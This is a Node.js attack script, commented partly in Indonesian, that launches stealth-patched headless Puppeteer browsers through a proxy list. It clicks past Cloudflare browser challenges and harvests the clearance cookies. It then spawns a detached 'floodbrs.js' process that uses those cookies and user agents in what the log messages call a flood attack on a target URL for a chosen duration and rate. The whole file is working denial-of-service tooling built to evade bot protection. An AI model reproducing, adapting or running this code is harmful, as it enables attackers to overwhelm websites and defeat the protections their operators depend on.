const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

console.log(`[ START ] Cloudflare Bypass Started - Target: ${targetURL}`);

// Read proxies - format: ip:port
const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return proxies.map(proxy => {
            // Clean proxy format - remove http/https if present
            return proxy.replace(/https?:\/\//, '').trim();
        });
    } catch (error) {
        console.log(`[ ERROR ] Cannot read proxy file: ${error.message}`);
        return [];
    }
};

// Generate user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// Wait functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const randomSleep = (min, max) => sleep(Math.random() * (max - min) + min);

// Cloudflare Cookie Class
class CloudflareCookie {
    constructor(cookieData) {
        this.name = cookieData.name || "";
        this.value = cookieData.value || "";
        this.domain = cookieData.domain || "";
        this.path = cookieData.path || "/";
        this.expires = cookieData.expires || 0;
        this.httpOnly = cookieData.httpOnly || false;
        this.secure = cookieData.secure || false;
        this.sameSite = cookieData.sameSite || "Lax";
    }

    static fromJSON(cookieData) {
        return new CloudflareCookie(cookieData);
    }

    toString() {
        return `${this.name}=${this.value}`;
    }
}

// Find Cloudflare cookies
const findCloudflareCookies = (cookies) => {
    const cfCookies = cookies.filter(cookie => 
        cookie.name.includes('cf_') || 
        cookie.name.includes('_cf') ||
        cookie.name === 'cf_clearance' ||
        cookie.name === '__cf_bm'
    ).map(cookie => CloudflareCookie.fromJSON(cookie));
    
    return cfCookies;
};

// Simple Cloudflare bypass - langsung click apapun yang ada
const simpleCloudflareBypass = async (page) => {
    try {
        console.log(`[ BYPASS ] Waiting for challenge page...`);
        
        // Tunggu page load
        await page.waitForFunction(() => document.readyState === 'complete');
        await sleep(5000);

        // Cari semua element yang bisa di click
        const clickableSelectors = [
            'input[type="checkbox"]',
            'input[type="submit"]',
            'button',
            '.button',
            '.btn',
            '[role="checkbox"]',
            '.hcaptcha-box',
            '.cf-checkbox',
            '#challenge-stage input',
            'input[name="cf_captcha_kind"]',
            '.verify-you-are-human',
            '.success',
            '.primary',
            'a',
            '[onclick]',
            'label',
            'div[style*="cursor"]'
        ];

        console.log(`[ BYPASS ] Trying to find clickable elements...`);

        for (const selector of clickableSelectors) {
            try {
                const elements = await page.$$(selector);
                console.log(`[ BYPASS ] Found ${elements.length} elements for selector: ${selector}`);
                
                for (const element of elements) {
                    try {
                        // Check if element is visible
                        const isVisible = await page.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            const style = window.getComputedStyle(el);
                            return rect.width > 0 && 
                                   rect.height > 0 && 
                                   style.visibility !== 'hidden' && 
                                   style.display !== 'none' &&
                                   style.opacity !== '0';
                        }, element);

                        if (isVisible) {
                            console.log(`[ BYPASS ] Clicking visible element: ${selector}`);
                            
                            // Scroll ke element
                            await page.evaluate(el => {
                                el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                            }, element);
                            
                            await sleep(1000);
                            
                            // Click element
                            await element.click({ delay: 50 });
                            console.log(`[ BYPASS ] Successfully clicked: ${selector}`);
                            
                            await sleep(8000);
                            
                            // Check if challenge solved
                            const title = await page.title();
                            const url = await page.url();
                            
                            if (!title.includes('Just a moment') && 
                                !title.includes('Checking your browser') &&
                                !url.includes('challenge')) {
                                console.log(`[ BYPASS ] Challenge solved after clicking: ${selector}`);
                                return { success: true };
                            }
                        }
                    } catch (clickError) {
                        console.log(`[ BYPASS ] Failed to click element: ${clickError.message}`);
                        continue;
                    }
                }
            } catch (selectorError) {
                continue;
            }
        }

        // Jika semua gagal, coba reload dan tunggu
        console.log(`[ BYPASS ] No clickable elements worked, waiting for auto-redirect...`);
        await sleep(15000);

        // Final check
        const title = await page.title();
        const url = await page.url();
        
        const isSuccess = !title.includes('Just a moment') && 
                         !title.includes('Checking your browser') &&
                         !title.includes('Please wait') &&
                         !url.includes('challenge');

        return { success: isSuccess };

    } catch (error) {
        console.log(`[ BYPASS ] Error: ${error.message}`);
        return { success: false };
    }
};

// Process each browser
const processBrowser = async (proxy, index, total) => {
    let browser;
    try {
        const userAgent = generateUserAgent();
        
        console.log(`[ THREAD ${index} ] Starting with proxy: ${proxy || 'DIRECT'}`);
        
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--disable-web-security',
            '--disable-features=site-per-process',
            '--disable-blink-features=AutomationControlled',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            '--disable-accelerated-2d-canvas',
            '--no-zygote',
            '--disable-background-timer-throttling'
        ];

        // Add proxy if available
        if (proxy && proxy.trim()) {
            args.push(`--proxy-server=${proxy}`);
            console.log(`[ THREAD ${index} ] Using proxy: ${proxy}`);
        }

        // Launch browser
        browser = await puppeteer.launch({
            headless: true,
            args: args,
            ignoreHTTPSErrors: true,
            timeout: 60000
        });

        const page = await browser.newPage();
        
        // Set viewport
        await page.setViewport({ 
            width: 1920, 
            height: 1080,
            deviceScaleFactor: 1
        });

        // Basic stealth
        await page.evaluateOnNewDocument(() => {
            // Override webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            
            // Override plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            
            // Override languages
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            
            // Mock chrome
            window.chrome = {
                runtime: {},
            };
        });

        // Set realistic headers
        await page.setExtraHTTPHeaders({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'pragma': 'no-cache'
        });

        console.log(`[ THREAD ${index} ] Navigating to target...`);
        
        // Navigate dengan timeout yang lebih longgar
        try {
            await page.goto(targetURL, { 
                waitUntil: 'domcontentloaded',
                timeout: 120000
            });
        } catch (navError) {
            console.log(`[ THREAD ${index} ] Navigation timeout, continuing anyway...`);
        }

        // Solve Cloudflare
        console.log(`[ THREAD ${index} ] Solving Cloudflare challenge...`);
        const bypassResult = await simpleCloudflareBypass(page);
        
        if (!bypassResult.success) {
            console.log(`[ THREAD ${index} ] Bypass failed, closing browser...`);
            await browser.close();
            return { success: false };
        }

        // Get success data
        const title = await page.title();
        const currentUrl = await page.url();
        const cookies = await page.cookies();
        const cfCookies = findCloudflareCookies(cookies);
        
        console.log(`[ THREAD ${index} ] Title: ${title}`);
        console.log(`[ THREAD ${index} ] URL: ${currentUrl}`);
        console.log(`[ THREAD ${index} ] Found ${cfCookies.length} Cloudflare cookies`);

        if (cfCookies.length === 0) {
            console.log(`[ THREAD ${index} ] No Cloudflare cookies found`);
            await browser.close();
            return { success: false };
        }

        const cookieString = cfCookies.map(cookie => cookie.toString()).join('; ');
        
        // Clean up browser
        await browser.close();

        // SUCCESS LOG
        console.log(`[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
        console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);

        // Start flood attack
        try {
            const floodProcess = spawn('node', [
                'floodbrs.js',
                targetURL,
                duration.toString(),
                rate,
                '1',
                proxyFile,
                cookieString,
                userAgent,
                'cf-cookie'
            ], {
                detached: true,
                stdio: 'ignore'
            });
            
            floodProcess.unref();
            console.log(`[ THREAD ${index} ] Flood process started`);
        } catch (spawnError) {
            console.log(`[ THREAD ${index} ] Failed to spawn flood process: ${spawnError.message}`);
        }

        return { success: true };
        
    } catch (error) {
        console.log(`[ THREAD ${index} ] Critical error: ${error.message}`);
        if (browser) {
            try {
                await browser.close();
            } catch (closeError) {
                // Ignore close errors
            }
        }
        return { success: false };
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        console.log(`[ ERROR ] No valid proxies found in file: ${proxyFile}`);
        process.exit(1);
    }

    console.log(`[ INFO ] Loaded ${proxies.length} proxies from ${proxyFile}`);
    console.log(`[ INFO ] Target URL: ${targetURL}`);
    console.log(`[ INFO ] Threads: ${threads}`);
    console.log(`[ INFO ] Duration: ${duration} seconds`);
    console.log(`[ INFO ] Rate: ${rate}`);

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < Math.min(proxies.length, threads); i++) {
        const result = await processBrowser(proxies[i], i + 1, proxies.length);
        
        if (result.success) {
            successCount++;
        } else {
            failCount++;
        }

        console.log(`[ STATS ] Success: ${successCount} | Failed: ${failCount} | Total: ${successCount + failCount}`);
        
        // Delay antara threads
        if (i < Math.min(proxies.length, threads) - 1) {
            const delay = 10000 + Math.random() * 5000;
            console.log(`[ INFO ] Waiting ${Math.round(delay/1000)} seconds before next thread...`);
            await sleep(delay);
        }
    }

    console.log(`[ FINAL ] Completed! Success: ${successCount}, Failed: ${failCount}`);
    console.log(`[ INFO ] Waiting for flood attacks to complete...`);
    
    // Tunggu sampai duration selesai
    await sleep(duration * 1000 + 30000);
    console.log(`[ END ] All processes finished`);
};

// Handle process exit
process.on('SIGINT', () => {
    console.log(`[ INFO ] Process interrupted by user`);
    process.exit(0);
});

process.on('uncaughtException', (error) => {
    console.log(`[ UNCAUGHT ERROR ] ${error.message}`);
});

process.on('unhandledRejection', (error) => {
    console.log(`[ UNHANDLED REJECTION ] ${error.message}`);
});

// Start the main process
main().catch(error => {
    console.log(`[ MAIN ERROR ] ${error.message}`);
    process.exit(1);
});
